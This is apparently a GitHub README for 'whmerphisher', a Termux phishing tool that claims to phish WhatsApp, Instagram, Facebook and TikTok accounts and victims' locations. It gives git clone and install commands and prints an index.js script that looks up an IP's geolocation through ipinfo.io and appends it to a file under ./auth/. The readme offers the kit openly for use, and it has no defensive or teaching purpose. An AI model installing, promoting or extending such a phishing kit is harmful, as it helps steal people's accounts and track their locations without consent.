
# whmer society 👩‍💻
### Hello! ( *whmerphisher* ) A phisher program created by the Whmer and sasame society, this program has some features. Phisher from [WhatsApp, Instagram, Facebook, Tik Tok, Location]

<center>

<p style="text-align: center;">
<img src="https://telegra.ph/file/c0a7b24585072577a9ca6.gif" width="220" height="220" style="">
</p>

</center>
<br>

 # Installation **[ Termux ] 🚀** 
 ## F-Droid *(Download Termux [Clicke Me](https://f-droid.org/pt_BR/packages/com.termux/))*

  - ### Installation program

```
git clone https://github.com/whmer/wphisher.git

cd wphisher

chmod +x install.sh

```

## index.js - source code | it returns data from a given IP

- [http://ipinfo.io/](http://ipinfo.io/)

```ts
const http = require('http');
const fs = require('fs');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('\n[-] IP : ', (ip) => {
  http.get(`http://ipinfo.io/${ip}/geo`, (resp) => {
    let data = '';

    resp.on('data', (chunk) => {
      data += chunk;
    });
    resp.on('end', () => {
      const parsedData = JSON.parse(data);
      const formattedData = JSON.stringify(parsedData, null, 2);
      console.log(formattedData);
      fs.writeFile('./auth/sam_info_ip.dat', formattedData, { flag: 'a'}, (err) => {
        if (err) throw err;
      });
    });

  }).on("error", (err) => {
    console.log("\nErro: " + err.message);
  });

  rl.close();
});

```

<p align="left">
  <a href="https://github.com/whmer" target="_blank"><img src="https://img.shields.io/badge/Github-blue?style=for-the-badge&logo=github"></a>
</p>




